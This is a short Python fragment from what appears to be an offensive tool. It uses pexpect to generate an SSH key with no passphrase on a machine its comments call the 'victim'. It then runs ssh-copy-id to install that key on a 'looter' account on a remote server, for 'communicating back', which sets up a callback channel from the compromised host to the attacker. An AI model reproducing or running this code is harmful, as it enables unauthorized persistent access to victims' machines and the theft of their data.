def pexpect_ssh_keygen():
    # pexpect ssh-keygen (if victim never had a ssh keygen before)

    cmd = "ssh-keygen"
    child = pexpect.spawn(
        cmd,
        logfile=sys.stdout,
        timeout=20
     )
    result=child.expect(
        [
            pexpect.EOF,
            'Enter file in which to save the key',
            'Overwrite (y/n)',
            pexpect.TIMEOUT,
            'Enter passphrase (empty for no passphrase)',
            'Enter same passphrase again:'
        ]
    )
    try:
        if(result==0):# If EOF error, send new line to keep process running
            child.sendline('\n')
        if(result==1):# If it asks for username
            # child.sendline(username)
            # # Wait 10 seconds for password prompt
            # child.expect_exact('Password',timeout=10)
            # child.sendline(password)
            child.sendline('\n')
        if(result==2):# if it asks for password
            child.sendline('n')
        if(result==3):# if timed out in 20 seconds. Release control to user
            child.interact()
        if(result==4):
            child.sendline("\n")
        if(result==5):
            child.sendline("\n")
    except:
        err = child.read()
        # print "UNKNOWN EXCEPTION:\r\n",err    
    return
def install_ssh_key(): # for communicating back with server
    pexpect_ssh_keygen()
    # ssh-copy-id to looter account on server
    bash_cmd("ssh-copy-id -p {} -f {}@{}".format(
        str(port),
        str(looter),
        str(host)
    ))
    return

